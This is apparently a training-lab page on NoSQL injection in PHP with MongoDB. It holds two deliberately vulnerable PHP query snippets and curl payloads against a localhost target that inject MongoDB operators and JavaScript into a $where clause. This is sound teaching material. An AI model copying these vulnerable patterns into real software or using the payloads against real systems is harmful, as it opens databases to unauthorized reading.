---
layout: page
title: "PHP & MongoDB"
---

## Lab

[View on GitHub](https://github.com/andrewkboyd/labs/tree/master/NoSQLi/php-mongo)

```bash
git clone https://github.com/andrewkboyd/labs andrewkboyd-labs
cd andrewkboyd-labs/NoSQLi/php-mongo
```

## Exploitable Code Samples

### 1. `find` for specific field
  - Vulnerable Code
    ```php
    $search = $_POST['q'];
    if ($_SERVER['REQUEST_METHOD'] == 'POST' && $search != '') {
      $cursor = $collection->find([ 'title' => $search ]);
    }
    ```
  - Sample queries
    ```bash
    » curl http://127.0.0.1:8080/books/ -d 'q[$exists]=true' -d 'q[$nin][]=Mere Christianity'
    » curl http://127.0.0.1:8080/books/ -d 'q[$exists]=1'
    » curl http://127.0.0.1:8080/books/ -d 'q[$exists]='
    » curl http://127.0.0.1:8080/books/ -d 'q[$in][]=Mere Christianity' -d 'q[$in][]=Narnia Chronicles'
    » curl http://127.0.0.1:8080/books/ -d 'q[$ne]=1'
    ```
### 2. `find` w/ text search
  - Vulnerable Code
    ```php
    $search = $_POST['q'];
    if ($_SERVER['REQUEST_METHOD'] == 'POST' && $search != '') {
      $cursor = $collection->find([ '$where' => "function () { return this.title.includes(\"$search\"); }" ]);
    }
    ```
  - Sample queries
    ```bash
    » curl http://127.0.0.1:8080/books/ --data-urlencode 'q=" + (function() { return \'Mere\'; })() + "'
    ```

### References

  - [MongoDB Query Selectors](https://docs.mongodb.com/manual/reference/operator/query/#query-selectors)

